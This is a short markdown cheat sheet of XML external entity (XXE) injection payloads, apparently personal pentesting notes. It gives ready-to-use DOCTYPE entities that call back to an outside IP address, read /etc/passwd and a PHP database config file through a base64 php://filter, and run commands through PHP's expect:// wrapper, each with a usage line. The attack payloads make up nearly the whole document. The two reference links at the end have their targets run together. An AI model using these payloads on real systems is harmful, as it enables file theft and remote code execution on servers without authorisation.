# xml external entity XXE

## Get ping back

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.161"> %xxe; ]>
# usage
<var>&xxe;</var>
```

## Read File

```
# using php-base64 when reading file that are not being loaded
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

# usage
<var>&xxe;</var>
```

## RCE using expect (PHP)

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id"> ]>
```

## Additional Materal

* [https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entityhttps://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)
* [https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entityhttps://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)
